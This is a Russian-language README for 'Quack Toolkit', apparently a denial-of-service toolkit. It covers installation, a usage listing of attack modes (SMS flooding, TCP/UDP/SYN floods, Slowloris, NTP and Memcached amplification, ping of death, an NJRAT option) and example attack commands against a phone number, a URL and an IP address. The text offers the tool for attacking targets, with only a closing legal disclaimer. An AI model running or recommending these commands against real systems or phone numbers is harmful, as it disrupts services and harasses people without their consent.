

# О наборе инструментов Quack

```
Это набор инструментов для отказа
сервисных атак. Quack Toolkit включает SMS-атаку
инструмент, инструмент атаки HTTP и многие другие инструменты атаки.
```

***

# Начинаем

## Quack установка

> cd quack

> chmod +x install.sh

> ./install.sh

## Удаление Quack

> cd quack

> chmod +x uninstall.sh

> ./uninstall.sh

***

# Выполнение Quack Toolkit

```
Для запуска Quack Toolkit вам необходимо:
выполните следующую команду.
```

> quack

```
usage: quack [-h] [--target <ip:port/URL/phone>]
             [--tool [SMS|NTP|TCP|UDP|SYN|POD|SLOWLORIS|MEMCACHED|HTTP|NJRAT]]
             [--timeout <timeout>] [--threads <threads>] [-u] [--version]

optional arguments:
  -h, --help            Показать это справочное сообщение и выйти
  --target <ip:port/URL/phone>
                        Целевой IP-адрес и порт, URL-адрес или телефон.
  --tool [SMS|NTP|TCP|UDP|SYN|POD|SLOWLORIS|MEMCACHED|HTTP|NJRAT]
                        Инструмент атаки.
  --timeout <timeout>   Тайм-аут в секундах.
  --threads <threads>   Количество потоков.
  -u, --update          Обновите Quack Toolkit.
  --version             Показать версию Quack Toolkit.
```

***
  
# Примеры Quack Toolkit

## Пример SMS-атаки
    
> quack --tool SMS --target 15554443333 --timeout 10 --threads 10
    
## Пример HTTP-атаки

> quack --tool HTTP --target http://<span></span>example.com/ --timeout 10 --threads 10
    
## Пример атаки TCP

> quack --tool TCP --target 192.168.1.100:80 --timeout 10 --threads 10

***

# Отказ от ответственности Quack Toolkit

```

Использование Quack Toolkit для атаки целей без предварительного обоюдного согласия является незаконным.
Конечный пользователь обязан соблюдать все применимые местные, государственные, федеральные и международные законы.
Разработчики не несут ответственности и не несут ответственности за любое неправильное использование или ущерб, причиненный этой программой.


```
